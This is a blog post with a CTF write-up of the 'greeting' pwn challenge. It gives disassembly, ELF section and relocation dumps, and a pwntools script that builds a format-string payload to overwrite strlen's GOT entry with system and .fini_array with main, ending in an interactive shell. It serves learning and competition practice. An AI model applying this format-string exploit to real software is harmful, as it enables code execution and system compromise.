<!doctype html>
<html lang="en">

<head>
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>kobadlve | greeting</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="greeting">
  <meta property="og:type" content="website">
  <meta property="og:url" content="/posts/greeting">
  <meta property="og:description" content="">
  <meta property="og:site_name" content="kobadlve">
  <meta property="og:image" content="/assets/og-image.jpg">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="/posts/greeting">
  <meta name="twitter:title" content="greeting">
  <meta name="twitter:description" content="">
  <meta name="twitter:image" content="/assets/og-image.jpg">

  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
  <link href="/feed.xml" type="application/rss+xml" rel="alternate" title="kobadlve Last 10 blog posts" />

  

  
    <link rel="stylesheet" href="/assets/dark.css">

  
</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="kobadlve">kobadlve</a>
  <div class="header-left">
    <a href="/blog/">Blog Top</a>
    <a href="/category/">Category</a>
  </div>
  <ul class="header-links">
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </ul>
</nav>

        <article class="article scrollappear">
          <header class="article-header">
            <h1>greeting</h1>
            <p></p>
            <div class="article-list-footer">
              <span class="article-list-date">
                April 21, 2017
              </span>
              <span class="article-list-divider">-</span>
              <span class="article-list-minutes">
                
                
                  5 minute read
                
              </span>
              <span class="article-list-divider">-</span>
              <div class="article-list-tags">
                
              </div>
            </div>
          </header>

          <div class="article-content">
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x080485ed &lt;+0&gt;:	push   ebp // 開始アドレスをpush
   0x080485ee &lt;+1&gt;:	mov    ebp,esp // edpにスタックトップアドレス代入
   0x080485f0 &lt;+3&gt;:	and    esp,0xfffffff0 // espが変な位置にないかcheck
   0x080485f3 &lt;+6&gt;:	sub    esp,0xa0 // esp = esp - 0xa0
   0x080485f9 &lt;+12&gt;:	mov    eax,gs:0x14 // eaxにgsセグメントのアドレス代入
   0x080485ff &lt;+18&gt;:	mov    DWORD PTR [esp+0x9c],eax // esp+0x9cのアドレスにeaxを代入
   0x08048606 &lt;+25&gt;:	xor    eax,eax // eaxを0で初期化
   0x08048608 &lt;+27&gt;:	mov    DWORD PTR [esp],0x80487b3 // espに0x80487b3を代入
   0x0804860f &lt;+34&gt;:	call   0x8048450 &lt;printf@plt&gt; // print Hello, I'm nao! Please tell me your name...
   0x08048614 &lt;+39&gt;:	mov    DWORD PTR [esp+0x4],0x40 // esp+0x4(0x80487b7)に0x40
   0x0804861c &lt;+47&gt;:	lea    eax,[esp+0x5c] // eax = [esp+0x5c]adress
   0x08048620 &lt;+51&gt;:	mov    DWORD PTR [esp],eax // espにeax([esp+0x5c]adress)代入
   0x08048623 &lt;+54&gt;:	call   0x8048679 &lt;getnline&gt; // call getnline
   0x08048628 &lt;+59&gt;:	test   eax,eax
   0x0804862a &lt;+61&gt;:	je     0x8048656 &lt;main+105&gt; // 0x8048656にjmp
   0x0804862c &lt;+63&gt;:	lea    eax,[esp+0x5c]
   0x08048630 &lt;+67&gt;:	mov    DWORD PTR [esp+0x8],eax
   0x08048634 &lt;+71&gt;:	mov    DWORD PTR [esp+0x4],0x80487d0
   0x0804863c &lt;+79&gt;:	lea    eax,[esp+0x1c]
   0x08048640 &lt;+83&gt;:	mov    DWORD PTR [esp],eax
   0x08048643 &lt;+86&gt;:	call   0x80484e0 &lt;sprintf@plt&gt;
   0x08048648 &lt;+91&gt;:	lea    eax,[esp+0x1c]
   0x0804864c &lt;+95&gt;:	mov    DWORD PTR [esp],eax
   0x0804864f &lt;+98&gt;:	call   0x8048450 &lt;printf@plt&gt;
   0x08048654 &lt;+103&gt;:	jmp    0x8048662 &lt;main+117&gt; // 0x8048662 jmp
   0x08048656 &lt;+105&gt;:	mov    DWORD PTR [esp],0x80487e9
   0x0804865d &lt;+112&gt;:	call   0x8048480 &lt;puts@plt&gt;
   0x08048662 &lt;+117&gt;:	mov    edx,DWORD PTR [esp+0x9c]
   0x08048669 &lt;+124&gt;:	xor    edx,DWORD PTR gs:0x14
   0x08048670 &lt;+131&gt;:	je     0x8048677 &lt;main+138&gt;
   0x08048672 &lt;+133&gt;:	call   0x8048470 &lt;__stack_chk_fail@plt&gt;
   0x08048677 &lt;+138&gt;:	leave  
   0x08048678 &lt;+139&gt;:	ret    
End of assembler dump.
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ disassemble getnline
Dump of assembler code for function getnline:
   0x08048679 &lt;+0&gt;:	push   ebp
   0x0804867a &lt;+1&gt;:	mov    ebp,esp
   0x0804867c &lt;+3&gt;:	sub    esp,0x28
   0x0804867f &lt;+6&gt;:	mov    eax,ds:0x8049a80
   0x08048684 &lt;+11&gt;:	mov    DWORD PTR [esp+0x8],eax
   0x08048688 &lt;+15&gt;:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804868b &lt;+18&gt;:	mov    DWORD PTR [esp+0x4],eax
   0x0804868f &lt;+22&gt;:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048692 &lt;+25&gt;:	mov    DWORD PTR [esp],eax
   0x08048695 &lt;+28&gt;:	call   0x8048460 &lt;fgets@plt&gt;
   0x0804869a &lt;+33&gt;:	mov    DWORD PTR [esp+0x4],0xa
   0x080486a2 &lt;+41&gt;:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486a5 &lt;+44&gt;:	mov    DWORD PTR [esp],eax
   0x080486a8 &lt;+47&gt;:	call   0x80484b0 &lt;strchr@plt&gt;
   0x080486ad &lt;+52&gt;:	mov    DWORD PTR [ebp-0xc],eax
   0x080486b0 &lt;+55&gt;:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080486b4 &lt;+59&gt;:	je     0x80486bc &lt;getnline+67&gt;
   0x080486b6 &lt;+61&gt;:	mov    eax,DWORD PTR [ebp-0xc]
   0x080486b9 &lt;+64&gt;:	mov    BYTE PTR [eax],0x0
   0x080486bc &lt;+67&gt;:	mov    eax,DWORD PTR [ebp+0x8]
   0x080486bf &lt;+70&gt;:	mov    DWORD PTR [esp],eax
   0x080486c2 &lt;+73&gt;:	call   0x80484c0 &lt;strlen@plt&gt;
   0x080486c7 &lt;+78&gt;:	leave  
   0x080486c8 &lt;+79&gt;:	ret    
End of assembler dump.

</code></pre></div></div>

<ol>
  <li>getnline()でstrlen()が呼ばれてるので、strlen()をsystem関数に書き換えて、/bin/shを起動する</li>
  <li>.fini_arrayをmainに書き換えて</li>
  <li>2度目のstrlen()でシェル起動</li>
</ol>

<h2 id="アドレスリーク">アドレスリーク</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kobad-virtual-machine% readelf -S greeting                   
There are 31 section headers, starting at offset 0xbc4:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048148 000148 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048168 000168 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        0804818c 00018c 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481b8 0001b8 0000f0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482a8 0002a8 00009c 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048344 000344 00001e 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048364 000364 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048394 000394 000018 08   A  5   0  4
  [10] .rel.plt          REL             080483ac 0003ac 000058 08   A  5  12  4
  [11] .init             PROGBITS        08048404 000404 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048430 000430 0000c0 04  AX  0   0 16
  [13] .text             PROGBITS        080484f0 0004f0 000252 00  AX  0   0 16
  [14] tomori            PROGBITS        08048742 000742 00003e 00  AX  0   0  1
  [15] .fini             PROGBITS        08048780 000780 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048794 000794 000069 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048800 000800 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        0804883c 00083c 0000f0 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      0804992c 00092c 000008 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049934 000934 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049938 000938 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         0804993c 00093c 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049a24 000a24 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        08049a28 000a28 000038 04  WA  0   0  4
  [25] .data             PROGBITS        08049a60 000a60 000008 00  WA  0   0  4
  [26] .bss              NOBITS          08049a80 000a68 000028 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 000a68 00004d 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 000ab5 00010d 00      0   0  1
  [29] .symtab           SYMTAB          00000000 00109c 000500 10     30  46  4
  [30] .strtab           STRTAB          00000000 00159c 00031d 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre></div></div>
<p>より、FINI_ARRAY = 08049934</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kobad-virtual-machine% objdump -d greeting | grep plt
 804841d:	e8 7e 00 00 00       	call   80484a0 &lt;__gmon_start__@plt&gt;
Disassembly of section .plt:
08048430 &lt;setbuf@plt-0x10&gt;:
08048440 &lt;setbuf@plt&gt;:
08048450 &lt;printf@plt&gt;:
08048460 &lt;fgets@plt&gt;:
08048470 &lt;__stack_chk_fail@plt&gt;:
08048480 &lt;puts@plt&gt;:
08048490 &lt;system@plt&gt;:
080484a0 &lt;__gmon_start__@plt&gt;:
080484b0 &lt;strchr@plt&gt;:
080484c0 &lt;strlen@plt&gt;:
080484d0 &lt;__libc_start_main@plt&gt;:
080484e0 &lt;sprintf@plt&gt;:
</code></pre></div></div>

<p>より、 8048490 <a href="mailto:system@plt">system@plt</a></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kobad-virtual-machine% readelf -r greeting

Relocation section '.rel.dyn' at offset 0x394 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049a24  00000706 R_386_GLOB_DAT    00000000   __gmon_start__
08049a80  00000e05 R_386_COPY        08049a80   stdin@GLIBC_2.0
08049aa0  00000c05 R_386_COPY        08049aa0   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x3ac contains 11 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049a34  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
08049a38  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
08049a3c  00000307 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
08049a40  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
08049a44  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
08049a48  00000607 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
08049a4c  00000707 R_386_JUMP_SLOT   00000000   __gmon_start__
08049a50  00000807 R_386_JUMP_SLOT   00000000   strchr@GLIBC_2.0
08049a54  00000907 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
08049a58  00000a07 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
08049a5c  00000b07 R_386_JUMP_SLOT   00000000   sprintf@GLIBC_2.0
</code></pre></div></div>
<p>より、　08049a54 <stlen_got_addr></stlen_got_addr></p>

<h2 id="exploit">Exploit</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *

main = 0x080485ed
system = 0x08048490
fini = 0x08049934
strlen = 0x8049a54

# p = remote('pwn2.chal.ctf.westerns.tokyo', 16317)
ex = 'aa'
ex += pack(0x08049936)
ex += pack(0x08049a56)
ex += pack(0x08049a54)
ex += pack(0x08049934)

# print(ex)

first = 0x804 - 0x1c - 0x8
# print(first)
second = 0x8490 - 0x0804
# print(second)
third = 0x85ed - 0x8490
# print(third)

ex += '%' + str(first) + 'x%12$hn'
ex += '%13$hn'
ex += '%' + str(second) + 'x%14$hn'
ex += '%' + str(third) + 'x%15$hn'
ex += ""

print(ex)
'''
print p.recvuntil('... ')
p.sendline(exploit)
print p.recvuntil('... ')
p.sendline("sh")
p.interactive()
'''

</code></pre></div></div>

          </div>

          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=greeting - /posts/greeting" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=/posts/greeting" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
            </a>
            <a href="https://plus.google.com/share?url=/posts/greeting" title="Share on Google+" rel="noreferrer noopener" target="_blank">
              <svg viewBox="0 0 128 128"><path d="M40.7 55.9v16.1c0 0 15.6 0 22 0C59.2 82.5 53.8 88.2 40.7 88.2c-13.3 0-23.7-10.8-23.7-24.2s10.4-24.2 23.7-24.2c7.1 0 11.6 2.5 15.8 5.9 3.3-3.3 3.1-3.8 11.6-11.9 -7.2-6.6-16.8-10.6-27.4-10.6C18.2 23.3 0 41.5 0 64c0 22.5 18.2 40.7 40.7 40.7 33.6 0 41.8-29.3 39-48.8H40.7zM113.9 56.7V42.6h-10.1v14.1H89.4v10.1h14.5v14.5h10.1V66.8H128V56.7H113.9z"/></svg>
            </a>
          </div>

          
        </article>
        <footer class="footer scrollappear">
  <p>
    Chalk is a high quality, completely customizable, performant and 100% free
    blog template for Jekyll built by
    <a href="/about" title="About me">Nielsen Ramon</a>. Download it <a href="https://github.com/nielsenramon/chalk" rel="noreferrer noopener" target="_blank" title="Download Chalk">here</a>.
  </p>
</footer>

      </div>
    </div>
  </main>
  

<script src="/assets/vendor.js"></script>



  <script src="/assets/webfonts.js"></script>




  <script src="/assets/scrollappear.js"></script>



<script src="/assets/application.js"></script>


</body>
</html>
